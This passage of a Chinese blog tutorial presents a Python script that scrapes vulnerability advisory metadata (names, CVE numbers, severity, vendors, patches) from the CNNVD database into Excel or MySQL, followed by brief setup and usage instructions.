class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">运行方法：</span></span><br><span class="line"><span class="string">python vulnerabilities_crawler 2017-10-01 2017-10-07 178</span></span><br><span class="line"><span class="string">第一个为开始时间，第二个为结束时间，第三个为总页数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得漏洞详情链接列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_url_list</span><span class="params">(url,start_time,end_time)</span>:</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 4.1.2; Nexus 7 Build/JZ054K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'http://cnnvd.org.cn/web/vulnerability/queryLds.tag'</span></span><br><span class="line">    &#125;    </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'qstartdate'</span>:<span class="string">'2017-10-30'</span>,                <span class="comment">#---------------》开始日期</span></span><br><span class="line">        <span class="string">'qenddate'</span>:<span class="string">'2017-10-31'</span>                    <span class="comment">#---------------》结束日期</span></span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="string">'qstartdate'</span>] = start_time </span><br><span class="line">    data[<span class="string">'qenddate'</span>] = end_time</span><br><span class="line">    data = parse.urlencode(data).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    vulnerabilities_url_html = urllib.request.Request(url,headers=header,data=data)</span><br><span class="line">    vulnerabilities_url_cookie = http.cookiejar.CookieJar()</span><br><span class="line">    vulnerabilities_url_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_url_cookie))</span><br><span class="line">    vulnerabilities_url_html = vulnerabilities_url_opener.open(vulnerabilities_url_html)</span><br><span class="line">    vulnerabilities_url_html = zlib.decompress(vulnerabilities_url_html.read(), <span class="number">16</span>+zlib.MAX_WBITS)</span><br><span class="line">    vulnerabilities_url_html = vulnerabilities_url_html.decode()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#提取漏洞详情链接</span></span><br><span class="line">    response = <span class="string">r'href="(.+?)" target="_blank" class="a_title2"'</span></span><br><span class="line">    vulnerabilities_link_list = re.compile(response).findall(vulnerabilities_url_html)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加http前序</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> vulnerabilities_link_list:</span><br><span class="line">        vulnerabilities_lists.append(<span class="string">'http://cnnvd.org.cn'</span>+vulnerabilities_link_list[i])</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">"已完成爬行第%d个漏洞链接"</span>%i)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息爬取函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_data</span><span class="params">(url)</span>:</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    vulnerabilities_data_html = urllib.request.Request(url,headers=header)</span><br><span class="line">    vulnerabilities_data_cookie = http.cookiejar.CookieJar()</span><br><span class="line">    vulnerabilities_data_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_data_cookie))</span><br><span class="line">    vulnerabilities_data_html = vulnerabilities_data_opener.open(vulnerabilities_data_html)</span><br><span class="line">    vulnerabilities_data_html = zlib.decompress(vulnerabilities_data_html.read(), <span class="number">16</span>+zlib.MAX_WBITS)</span><br><span class="line">    vulnerabilities_data_html = vulnerabilities_data_html.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> vulnerabilities_result_list</span><br><span class="line">    vulnerabilities_result_list=[]    <span class="comment">#抓取信息列表命名</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加漏洞信息详情</span></span><br><span class="line">    vulnerabilities_detainled_soup1 = BeautifulSoup(vulnerabilities_data_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    vulnerabilities_detainled_data = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'detail_xq w770'</span>&#125;)    <span class="comment">##定义 漏洞信息详情 块的soup</span></span><br><span class="line">    vulnerabilities_detainled_data = vulnerabilities_detainled_data.decode()</span><br><span class="line">    vulnerabilities_detainled_soup = BeautifulSoup(vulnerabilities_detainled_data,<span class="string">'html.parser'</span>)    <span class="comment">#二次匹配    </span></span><br><span class="line"></span><br><span class="line">    vulnerabilities_detainled_data_list = vulnerabilities_detainled_soup.find_all(<span class="string">'li'</span>)    <span class="comment">#标签a信息汇总    </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_name = vulnerabilities_detainled_soup.h2.string    <span class="comment">#漏洞名称</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_name = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_name)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_cnnvd_num = vulnerabilities_detainled_soup.span.string    <span class="comment">#cnnvd编号</span></span><br><span class="line">        vulnerabilities_cnnvd_num = re.findall(<span class="string">r"\：([\s\S]*)"</span>,vulnerabilities_cnnvd_num)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_cnnvd_num = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_cnnvd_num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:                            <span class="comment">#漏洞等级</span></span><br><span class="line">        vulnerabilities_rank = vulnerabilities_detainled_soup.a.decode()</span><br><span class="line">        vulnerabilities_rank = re.search(<span class="string">u'([\u4e00-\u9fa5]+)'</span>,vulnerabilities_rank).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_rank = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_rank)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_cve_html = vulnerabilities_detainled_data_list[<span class="number">2</span>].decode()    <span class="comment">#漏洞cve编号</span></span><br><span class="line">    vulnerabilities_cve_soup = BeautifulSoup(vulnerabilities_cve_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_cve = vulnerabilities_cve_soup.a.string</span><br><span class="line">        vulnerabilities_cve = vulnerabilities_cve.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_cve = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_cve)</span><br><span class="line">    </span><br><span class="line">    vulnerabilities_type_html = vulnerabilities_detainled_data_list[<span class="number">3</span>].decode()    <span class="comment">#漏洞类型</span></span><br><span class="line">    vulnerabilities_type_soup = BeautifulSoup(vulnerabilities_type_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_type = vulnerabilities_type_soup.a.string</span><br><span class="line">        vulnerabilities_type = vulnerabilities_type.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_type = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_type)</span><br><span class="line">    </span><br><span class="line">    vulnerabilities_time_html = vulnerabilities_detainled_data_list[<span class="number">4</span>].decode()    <span class="comment">#发布时间</span></span><br><span class="line">    vulnerabilities_time_soup = BeautifulSoup(vulnerabilities_time_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        vulnerabilities_time = vulnerabilities_time_soup.a.string</span><br><span class="line">        vulnerabilities_time = vulnerabilities_time.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_time = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_time)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_attack_html = vulnerabilities_detainled_data_list[<span class="number">5</span>].decode()    <span class="comment">#威胁类型</span></span><br><span class="line">    vulnerabilities_attack_soup = BeautifulSoup(vulnerabilities_attack_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        vulnerabilities_attack = vulnerabilities_attack_soup.a.string</span><br><span class="line">        vulnerabilities_attack = vulnerabilities_attack.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_attack = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_attack)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_update_html = vulnerabilities_detainled_data_list[<span class="number">6</span>].decode()    <span class="comment">#更新时间</span></span><br><span class="line">    vulnerabilities_update_soup = BeautifulSoup(vulnerabilities_update_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_update = vulnerabilities_update_soup.a.string</span><br><span class="line">        vulnerabilities_update = vulnerabilities_update.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_update = <span class="string">''</span>    </span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_update)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_firm_html = vulnerabilities_detainled_data_list[<span class="number">7</span>].decode()    <span class="comment">#厂商</span></span><br><span class="line">    vulnerabilities_firm_soup = BeautifulSoup(vulnerabilities_firm_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_firm = vulnerabilities_firm_soup.a.string</span><br><span class="line">        vulnerabilities_firm = vulnerabilities_firm.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_firm = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_firm)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_source_html = vulnerabilities_detainled_data_list[<span class="number">8</span>].decode()    <span class="comment">#漏洞来源</span></span><br><span class="line">    vulnerabilities_source_soup = BeautifulSoup(vulnerabilities_source_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_source = vulnerabilities_source_soup.a.string</span><br><span class="line">        vulnerabilities_source = vulnerabilities_source.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_source = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_source)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#添加漏洞简介详情</span></span><br><span class="line">    vulnerabilities_title_html = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj'</span>&#125;)    <span class="comment">#定义 漏洞简介 块的soup</span></span><br><span class="line">    vulnerabilities_title_html = vulnerabilities_title_html.decode()</span><br><span class="line">    vulnerabilities_title_soup2 = BeautifulSoup(vulnerabilities_title_html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_titles1 = vulnerabilities_title_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_titles2 = vulnerabilities_title_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_titles = vulnerabilities_titles1 + vulnerabilities_titles2</span><br><span class="line">        vulnerabilities_titles = vulnerabilities_titles.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_titles = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_titles)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#漏洞公告</span></span><br><span class="line">    vulnerabilities_notice_html = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)    <span class="comment">#定义 漏洞公告 块的soup</span></span><br><span class="line">    vulnerabilities_notice_html = vulnerabilities_notice_html.decode()</span><br><span class="line">    vulnerabilities_notice_soup2 = BeautifulSoup(vulnerabilities_notice_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_notice1 = vulnerabilities_notice_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_notice2 = vulnerabilities_notice_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_notice = vulnerabilities_notice1+vulnerabilities_notice2</span><br><span class="line">        vulnerabilities_notice = vulnerabilities_notice.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_notice = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_notice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#参考网址</span></span><br><span class="line">    vulnerabilities_reference_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">1</span>]    <span class="comment">#定义 参考网址 块的soup</span></span><br><span class="line">    vulnerabilities_reference_html = vulnerabilities_reference_html.decode()</span><br><span class="line">    vulnerabilities_reference_soup2 = BeautifulSoup(vulnerabilities_reference_html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_reference = vulnerabilities_reference_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_reference = vulnerabilities_reference.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">'链接:'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_reference = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_reference)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#受影响实体</span></span><br><span class="line">    vulnerabilities_effect_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">2</span>]    <span class="comment">#定义 受影响实体 块的soup</span></span><br><span class="line">    vulnerabilities_effect_html = vulnerabilities_effect_html.decode()</span><br><span class="line">    vulnerabilities_effect_soup2 = BeautifulSoup(vulnerabilities_effect_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_effect = vulnerabilities_effect.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name=<span class="string">'a'</span>)[<span class="number">0</span>].string</span><br><span class="line">            vulnerabilities_effect = vulnerabilities_effect.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            vulnerabilities_effect = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_effect)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#补丁</span></span><br><span class="line">    vulnerabilities_patch_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">3</span>]    <span class="comment">#定义 补丁 块的soup</span></span><br><span class="line">    vulnerabilities_patch_html = vulnerabilities_patch_html.decode()</span><br><span class="line">    vulnerabilities_patch_soup2 = BeautifulSoup(vulnerabilities_patch_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_patch = vulnerabilities_patch_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_patch = vulnerabilities_patch.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_patch = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_patch)</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息写入excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_excel</span><span class="params">(excel)</span>:</span></span><br><span class="line">    workbook = xlsxwriter.Workbook(<span class="string">'vulnerabilities_data.xlsx'</span>)</span><br><span class="line">    worksheet = workbook.add_worksheet()</span><br><span class="line"></span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    col = <span class="number">0</span></span><br><span class="line">    worksheet.write(row,<span class="number">0</span>,<span class="string">'漏洞名称'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">1</span>,<span class="string">'CNNVD编号'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">2</span>,<span class="string">'危害等级'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">3</span>,<span class="string">'CVE编号'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">4</span>,<span class="string">'漏洞类型'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">5</span>,<span class="string">'发布时间'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">6</span>,<span class="string">'攻击途径'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">7</span>,<span class="string">'更新时间'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">8</span>,<span class="string">'厂商'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">9</span>,<span class="string">'漏洞来源'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">10</span>,<span class="string">'漏洞简介'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">11</span>,<span class="string">'漏洞公告'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">12</span>,<span class="string">'参考链接'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">13</span>,<span class="string">'受影响实体'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">14</span>,<span class="string">'补丁'</span>)</span><br><span class="line"></span><br><span class="line">    row = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(excel)):</span><br><span class="line">        worksheet.write(row,col,excel[i][<span class="number">0</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">1</span>,excel[i][<span class="number">1</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">2</span>,excel[i][<span class="number">2</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">3</span>,excel[i][<span class="number">3</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">4</span>,excel[i][<span class="number">4</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">5</span>,excel[i][<span class="number">5</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">6</span>,excel[i][<span class="number">6</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">7</span>,excel[i][<span class="number">7</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">8</span>,excel[i][<span class="number">8</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">9</span>,excel[i][<span class="number">9</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">10</span>,excel[i][<span class="number">10</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">11</span>,excel[i][<span class="number">11</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">12</span>,excel[i][<span class="number">12</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">13</span>,excel[i][<span class="number">13</span>])</span><br><span class="line">        worksheet.write(row,col+<span class="number">14</span>,excel[i][<span class="number">14</span>])</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    workbook.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息写入数据库</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_mysql</span><span class="params">(excel)</span>:</span></span><br><span class="line">    db = pymysql.connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'xxxx'</span>,<span class="string">'spider'</span>,charset=<span class="string">'utf8'</span>)</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(excel)):</span><br><span class="line">        sql=<span class="string">"INSERT INTO cnnvd(vulnerabilities_name,cnnvd_num,vulnerabilities_rank,cve_num,vulnerabilities_type,release_time,attack_path,update_time,company,vulnerabilities_source,vulnerabilities_data,solution,reference,object,path) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);"</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(sql,(excel[i][<span class="number">0</span>],excel[i][<span class="number">1</span>],excel[i][<span class="number">2</span>],excel[i][<span class="number">3</span>],excel[i][<span class="number">4</span>],excel[i][<span class="number">5</span>],excel[i][<span class="number">6</span>],excel[i][<span class="number">7</span>],excel[i][<span class="number">8</span>],excel[i][<span class="number">9</span>],excel[i][<span class="number">10</span>],excel[i][<span class="number">11</span>],excel[i][<span class="number">12</span>],excel[i][<span class="number">13</span>],excel[i][<span class="number">14</span>]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'写入数据库失败'</span>)</span><br><span class="line">    print(<span class="string">'写入数据库完毕！！！'</span>)</span><br><span class="line">    db.commit()</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#爬取代理ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#调用漏洞列表函数并获得漏洞链接列表</span></span><br><span class="line">    begin = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">global</span> vulnerabilities_lists</span><br><span class="line">    vulnerabilities_lists=[]</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    page_count = sys.argv[<span class="number">3</span>]</span><br><span class="line">    page_count = int(page_count) </span><br><span class="line">    start_time = sys.argv[<span class="number">1</span>]</span><br><span class="line">    end_time = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> j&lt;=page_count:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_url = <span class="string">'http://cnnvd.org.cn/web/vulnerability/queryLds.tag?pageno=%d&amp;repairLd='</span>%j</span><br><span class="line">            vulnerabilities_url_list(vulnerabilities_url,start_time,end_time)</span><br><span class="line">            print(<span class="string">"已完成爬行第%d页"</span>%j)</span><br><span class="line">            print(<span class="string">'\n'</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'爬取失败，等待5秒后重新爬取。'</span>)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用漏洞信息函数并爬取漏洞信息</span></span><br><span class="line">    vulnerabilities_result_lists = []    </span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a &lt; len(vulnerabilities_lists):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_data(vulnerabilities_lists[a])</span><br><span class="line">            vulnerabilities_result_lists.append(vulnerabilities_result_list)</span><br><span class="line">            a+=<span class="number">1</span></span><br><span class="line">            print(<span class="string">"完成爬行第%d个漏洞信息"</span>%a)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'爬取失败，等待5秒后重新爬取。'</span>)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#漏洞信息写入excel</span></span><br><span class="line">    vulnerabilities_excel(vulnerabilities_result_lists)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#漏洞信息写入MySQL</span></span><br><span class="line">    <span class="comment">#vulnerabilities_mysql(vulnerabilities_result_lists)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#爬行结束</span></span><br><span class="line">    end = datetime.datetime.now()</span><br><span class="line">    total_time = end - begin</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'漏洞信息爬取结束'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'应该爬行漏洞数量： '</span>,len(vulnerabilities_lists))</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'爬行时间： '</span>,total_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>将代码保存为<code>CNNVD_crawl.py</code>,然后按<code>win + R</code> 输入<code>cmd</code>,切换到该文件的保存路径</p><h2 id="1-2-安装第三方模块"><a href="#1-2-安装第三方模块" class="headerlink" title="1.2 安装第三方模块"></a>1.2 安装第三方模块</h2><p>在运行的过程中需要第三方模块的支持，所以需要安装第三方模块，使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python - m pip install 第三方模块名称</span><br></pre></td></tr></table></figure><h1 id="0x02-使用教程"><a href="#0x02-使用教程" class="headerlink" title="0x02 使用教程"></a>0x02 使用教程</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cnnvd_crawl.py <span class="number">2019</span><span class="number">-08</span><span class="number">-26</span> <span class="number">2019</span><span class="number">-08</span><span class="number">-28</span> <span class="number">26</span></span><br></pre></td></tr></table></figure><p>参数说明：</p><p><code>cnnvd_crawl.py</code>: 为脚本文件</p><p><code>2019-08-26 